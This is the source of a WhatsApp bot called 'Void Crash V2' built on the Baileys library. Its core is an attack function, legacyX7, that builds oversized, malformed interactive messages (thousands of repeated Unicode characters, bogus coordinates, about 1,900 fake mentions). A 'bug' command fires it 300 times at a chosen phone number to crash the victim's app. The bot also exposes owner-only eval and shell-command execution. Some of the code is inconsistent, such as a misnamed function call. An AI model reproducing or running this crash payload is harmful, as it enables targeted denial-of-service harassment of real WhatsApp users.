console.clear();
require('./setting/config')

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeWaSocket,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys");

//END
//EXPORTS BASIC MODULE

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const jimp = require("jimp")
const axios = require('axios')
const fsx = require('fs-extra')
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')
const { spawn, exec, execSync } = require('child_process')
//END
//MODULE MESSAGE + PREFIX

module.exports = Ril = async (Ril, m, chatUpdate, store) => {
    try {
        var body = (
            m.mtype === "conversation" ? m.message.conversation || "[Conversation]" :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption || "[Image]" :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption || "[Video]" :
            m.mtype === "audioMessage" ? m.message.audioMessage.caption || "[Audio]" :
            m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "[Sticker]" :
            m.mtype === "documentMessage" ? m.message.documentMessage.fileName || "[Document]" :
            m.mtype === "contactMessage" ? "[Contact]" :
            m.mtype === "locationMessage" ? m.message.locationMessage.name || "[Location]" :
            m.mtype === "liveLocationMessage" ? "[Live Location]" :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text || "[Extended Text]" :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId || "[Button Response]" :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId || "[List Response]" :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId || "[Template Button Reply]" :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson)?.id || "[Interactive Response]" :
            m.mtype === "pollCreationMessage" ? "[Poll Creation]" :
            m.mtype === "reactionMessage" ? m.message.reactionMessage.text || "[Reaction]" :
            m.mtype === "ephemeralMessage" ? "[Ephemeral]" :
            m.mtype === "viewOnceMessage" ? "[View Once]" :
            m.mtype === "productMessage" ? m.message.productMessage.product?.name || "[Product]" :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text || "[Message Context]" :
            "[Unknown Type]"
        );
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END
//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('./System/x1')

//END

const Owner = JSON.parse(fs.readFileSync('./Access/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./Access/Prem.json'))
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await Ril.decodeJid(Ril.user.id)
const CreatorOnly = [BotNum, ...Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await Ril.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''

const Rilyzy = fs.readFileSync(`./System/Thumb.jpg`)

if (!Ril.public) {
if (!CreatorOnly) return
}
//- P -\\
if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`# New Message`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

//FUNCTION
async function legacyX7(target) {
const xput = "𑜦𑜠".repeat(1000) + "ꦾ".repeat(1000);
  try {
    const message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: xput,
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: xput,
                address: "\u0000",
              },
            },
            body: {
              text: "Dapzy Kill You" + xput,
            },
            nativeFlowResponseMessage: {
              name: "payment_transaction_details",
              paramsJson: "\u08A0".repeat(10000),
              version: 3
            },
            contextInfo: {
              participant: target,
                mentionedJid: [
                  "0@s.whatsapp.net",
                 ...Array.from(
                 { length: 1900 },
                 () =>
                 "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                ),
              ],
            },
          }, 
        },
      },
    };
    
    //const msg = generateWAMessageFromContent(target, message, {});

    await Ril.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
      });

    console.log("LegacyX7 Succes Attack!✅");
  } catch (error) {
    console.log("❌ error:\n" + error);
  }
}

// end
const zets = {
  key: {
	fromMe: false,
	  participant: "0@s.whatsapp.net",
		remoteJid: "status@broadcast"
	  },
		message: {
		  orderMessage: {
		  orderId: "2029",
		  thumbnail: Rilyzy, 
		    itemCount: `9999999`,
		    status: "INQUIRY",
		    surface: "CATALOG",
		    message: `#Dapzy4`,
		    token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
		  }
	    },
	    contextInfo: {
		  mentionedJid: [m.sender],
		  forwardingScore: 999,
		  isForwarded: true
		}
	  }

const ReplyRil = (teks) => {
  return Ril.sendMessage(
    m.chat,
    {
      text: teks,
      contextInfo: {
        mentionedJid: [m.chat],
        forwardingScore: 99999999,
        isForwarded: true,
        externalAdReply: {
          title: "#Void Crash",
          body: "© Void Crash",
          mediaType: 1,
          renderLargerThumbnail: false,
          showAdAttribution: false,
          thumbnailUrl: "https://daffa-dev.my.id/upload/oaiko.jpg",
          sourceUrl: ""
        }
      }
    },
    { quoted: zets }
  );
};

//END

const RunTime = `_${runtime(process.uptime())}_`
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
//ALL MENU CASE {
case 'menu': {
await Ril.sendMessage(m.chat, {
  interactiveMessage: {
     title: `─ Hello ${m.pushName}, My Name is Void Crash V2, I am an Automated Bot That Works To Help 

─ ! Information
- Creator : Andika Official 
- Script : Void Crash V2
- Developer : t.me/andikaoffic
- Version : 2.0.0
- Runtime : ${runtime(process.uptime())}

─ ! Bug Menu
- .x ( 62××× ) 
- .dapz ( 62××× )

─ ! Owner menu
- .addown ( 62××× )
- .delown ( 62××× )
- .addprem ( 62××× )
- .delprem ( 62××× )
- .public
- .self 
`, 
  footer: "Andika? yes I'm",
     image: { url: './System/lgeX7.jpg' },
        nativeFlowMessage: {
           messageParamsJson: JSON.stringify({
              limited_time_offer: {
                text: "Void Crash",
                url: "t.me/andikaoffic",
                copy_code: "#Void Crash",
                 expiration_time: Date.now() * 999
                },
              bottom_sheet: {
                in_thread_buttons_limit: 2, 
                divider_indices: [1, 2, 3, 4, 5, 999],
                list_title: "#Dapzy v11",
                 button_title: "</>"
                },
              tap_target_configuration: {
                title: " X ",
                description: "bomboclard",
                canonical_url: "https://t.me/LvoryPutraa",
                domain: "shop.example.com",
                button_index: 0
              }
            }),
           buttons: [
              {
                 name: "single_select",
                 buttonParamsJson: JSON.stringify({
                   has_multiple_buttons: true
                })
                },
                {
                 name: "call_permission_request",
                 buttonParamsJson: JSON.stringify({
                   has_multiple_buttons: true
                })
                },
                {
                 name: "single_select",
                 buttonParamsJson: JSON.stringify({      
                    title: "#Allmenu",
                    sections: [
                 {
                 title: "#Dapzy 4you",
                    highlight_label: "Recommend",
                    rows: [
                 {
                 title: "Dapzy 4you",
                    description: "Menampilkan ( Dapzy 4you )",
                    id: "xx",
                 }, 
                 {
                 title: "Dapzyv11",
                    description: "Menampilkan ( Dapzyv11 )",
                    id: "xx"
                 }
              ]
           }
        ],
     has_multiple_buttons: true
  })
},
{
  name: "cta_url",
    buttonParamsJson: JSON.stringify({
      display_text: "#Contact Dapzy!", 
        url: "https://t.me/MeRyuzaki67",
        merchant_url: "https://t.me/MeRyuzaki67"
       })
     }
   ]
 }
}
}, { quoted: zets });
break 
}
//=======================\\
//===========case OwnMenu/Fun============\\
case 'addowner': case 'addown':
if (!CreatorOnly) return ReplyRil("*Your Not Owner*")
  if (!args[0]) return ReplyRil(`Penggunaan : ${prefix + command} Example ${prefix + command} 628xx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let loadnum = await Ril.onWhatsApp(numero + `@s.whatsapp.net`);
  if (loadnum.length == 0) return ReplyRil(`Number Invalid!!!`);
  owner.push(numero);
  Premium.push(numero);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRil(`Number ${numero} succes add to database!`);
  break;
//=======================\\
case 'delowner': case 'delown':
if (!CreatorOnly) return ReplyRil("*Your Not Owner*")
  if (!args[0]) return ReplyRil(`Penggunaan: ${prefix + command} Example:\n ${prefix + command} 628xx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Owner.indexOf(numero2);
  numload = Premium.indexOf(numero2);
  Owner.splice(numeroX, 1);
  Premium.splice(numload, 1);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(Owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRil(`Number ${numero2} succes delate to database!`);
  break;
//=======================\\
case 'addpremium': case 'addprem':
if (!CreatorOnly) return ReplyRil("*Your Not Owner*")
  if (!args[0]) return ReplyRil(`Penggunaan: ${prefix + command} Example ${prefix + command} 628xx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let Invalid = await Ril.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return ReplyRil(`Number Invalid!!!`);
  Premium.push(numero);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRil(`Number ${numero} succes add to database!`);
  break;
//=======================\\
case 'delpremium': case 'delprem':
if (!CreatorOnly) return ReplyRil("*Your Not Owner*")
  if (!args[0]) return ReplyRil(`Penggunaan ${prefix + command} Example ${prefix + command} 628xx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Premium.indexOf(numero2);
  Premium.splice(numeroX, 1);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRil(`Number ${numero2} succes delate to database!`);
  break;
//=======================\\
case 'public': {
  if (!CreatorOnly) return ReplyRil("*You're Not My Owner*");

  Ril.public = true;
  ReplyRil(`*Success: Changed Mode from Self to Public*`);
}
break;
//=======================\\
case 'self': case 'private': {
  if (!CreatorOnly) return ReplyRil("*You're Not My Owner*");

  Ril.public = false;
  ReplyRil(`*Success: Changed Mode from Public to Self*`);
}
break;

case "eval": {
                if (!budy.startsWith(".eval")) return;
                
                const args = budy.trim().split(' ').slice(1).join(' ');
                if (!args) return ReplyRil(`*ex:* ${prefix + command} m.chat`);
                let teks;
                try {
                    teks = await eval(`(async () => { ${args.startsWith("return") ? "" : "return"} ${args} })()`);
                } catch (e) {
                    teks = e;
                } finally {
                    await ReplyRil(require('util').format(teks));
                }
            }
            break;

case "info": {
  const messType = m.quoted ? { [m.quoted.mtype]:m.quoted } : { [m.mtype]:m.message };
  const formattedJson = JSON.stringify(messType, null, 2);
  Ril.relayMessage(m.chat, {
    "extendedTextMessage": {
      "text": formattedJson 
    }
  }, {});
}
break;

case "swgrup": case "swgc": {
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
                const jid = m.chat;
                
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await Ril.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                    ReplyRil("Succes Add Status To Group")
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await Ril.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                    ReplyRil("Succes Add Status To Group")
                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await Ril.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                    ReplyRil("Succes Add Status To Group")
                } else if (caption) {
                    await Ril.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                    ReplyRil("Succes Add Status To Group")
                } else {
                    await ReplyRil(`reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai ini saya`);
                }
            }
            break;
//=======================\\

//===========Case Bug!============\\
case 'x':
case 'dapz': {
    if (!PremOnly) return ReplyRil("*You are not a Premium User*");
    if (!q) return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    ReplyRil(`*Success! Send Bug to ${target}*`);

    for (let r = 0; r < 300; r++) {
    await LegacyX7(target)
    await sleep(100)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
//=======================\\
//END
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!CreatorOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return ReplyRil(bang)}
try {
ReplyRil(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
ReplyRil(String(e))}}
if (budy.startsWith('>')) {
if (!CreatorOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await ReplyRil(evaled)
} catch (err) {
await ReplyRil(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!CreatorOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return ReplyRil(`${err}`)
if (stdout) return m.reply(stdout)
})
}
//========================================================\\
}
} catch (err) {
Ril.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\